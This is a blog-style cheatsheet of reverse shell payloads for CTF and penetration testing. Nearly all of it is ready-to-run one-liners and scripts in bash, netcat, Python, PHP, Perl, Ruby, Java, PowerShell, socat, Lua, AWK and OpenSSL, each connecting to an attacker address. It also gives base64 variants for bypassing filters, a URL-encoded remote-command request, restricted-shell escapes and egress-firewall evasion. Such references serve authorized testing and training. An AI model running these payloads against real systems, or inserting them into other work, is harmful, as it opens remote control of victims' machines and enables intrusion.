---
title: Reverse Shells Cheatsheet
published: 2024-01-20
description: 'Comprehensive collection of reverse shell one-liners and techniques for different platforms and scenarios'
image: ''
tags: [ReverseShell, PostExploitation, CTF, RedTeam]
category: 'Notes'
draft: false
---

# Reverse Shells Cheatsheet

A comprehensive collection of reverse shell payloads for various languages and scenarios. Essential for CTFs and penetration testing.

## Setup Listener

Before executing any reverse shell, set up a listener on your attacking machine:

```bash
# Netcat
nc -lvnp 4444

# Netcat with specific interface
nc -lvnp 4444 -s 10.10.14.5

# Using rlwrap for better shell (arrow keys, history)
rlwrap nc -lvnp 4444

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"
```

## Bash Reverse Shells

### Standard Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Alternative
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Base64 encoded (bypass filters)
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash
```

### /dev/tcp Method
```bash
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# One-liner
exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Netcat Reverse Shells

### Traditional Netcat
```bash
nc -e /bin/bash 10.10.14.5 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### BusyBox Netcat
```bash
busybox nc 10.10.14.5 4444 -e /bin/bash
```

### OpenBSD Netcat
```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.5 4444 0</tmp/p | /bin/bash 1>/tmp/p
```

## Python Reverse Shells

### Python 2
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Shorter version
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### IPv6 Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef::1",4444,0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP Reverse Shells

### PHP One-liner
```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Alternative
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/bash -i <&3 >&3 2>&3");'

# Using system()
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/bash -i <&3 >&3 2>&3");'
```

### PHP Full Script
```php
<?php
$sock = fsockopen("10.10.14.5", 4444);
$proc = proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### PentestMonkey PHP Reverse Shell
Download from: https://github.com/pentestmonkey/php-reverse-shell

## Perl Reverse Shells

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Shorter version
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby Reverse Shells

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# Alternative
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.5","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

## Java Reverse Shells

```java
// Runtime.exec()
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// One-liner
public class shell { public static void main(String[] args) { try { Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"}); } catch (Exception e) { } } }
```

## PowerShell Reverse Shells

### PowerShell One-liner
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### PowerShell Base64 Encoded
```powershell
# Encode payload
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

# Execute
powershell -enc <base64_payload>
```

### Nishang PowerShell TCP
Download: https://github.com/samratashok/nishang

```powershell
Import-Module .\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
```

## Socat Reverse Shells

```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444

# Encrypted shell
# Generate certificate: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
# Combine: cat shell.key shell.crt > shell.pem

# Listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -

# Reverse shell
socat OPENSSL:10.10.14.5:4444,verify=0 EXEC:/bin/bash
```

## Lua Reverse Shell

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

## AWK Reverse Shell

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## OpenSSL Reverse Shell

```bash
# On attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# On victim
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```

## Web Shells (URL Encoded)

### Command Execution via URL
```bash
# For web applications with RCE
curl http://target.com/page.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261%27
```

## Shell Upgrading

Once you have a basic shell, upgrade it to a fully interactive TTY:

### Python PTY
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Then
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal size
```

### Using Script
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Using Expect
```bash
expect -c 'spawn /bin/bash; interact'
```

## Bypassing Restricted Shells

```bash
# Find available commands
compgen -c

# Execute commands
ssh user@host -t "bash --noprofile"
ssh user@host -t "/bin/bash"

# Escaping rbash
BASH_CMDS[a]=/bin/bash;a
export PATH=/usr/local/bin:/usr/bin:/bin
cd /tmp;/bin/bash
```

## Firewall Evasion

### Egress Filtering Bypass
```bash
# Try common allowed ports
# Port 80 (HTTP)
bash -i >& /dev/tcp/10.10.14.5/80 0>&1

# Port 443 (HTTPS)
bash -i >& /dev/tcp/10.10.14.5/443 0>&1

# Port 53 (DNS)
bash -i >& /dev/tcp/10.10.14.5/53 0>&1
```

### ICMP Tunnel
```bash
# Using icmpsh
# On attacker: sysctl -w net.ipv4.icmp_echo_ignore_all=1
# Run: icmpsh -t 10.10.14.5 -d 500 -s 128
```

## Quick Reference

**Most Reliable Shells:**
1. Bash TCP: `bash -i >& /dev/tcp/IP/PORT 0>&1`
2. Python: `python3 -c 'import pty;...`
3. Netcat mkfifo: `rm /tmp/f;mkfifo /tmp/f;...`

**For Windows:**
1. PowerShell TCP client
2. Nishang scripts
3. MSFVenom payloads

**Remember:** 
- Always use proper authorization
- Modify IP and PORT in payloads
- URL encode when necessary
- Upgrade shell to fully interactive TTY
- Check firewall rules for allowed egress ports
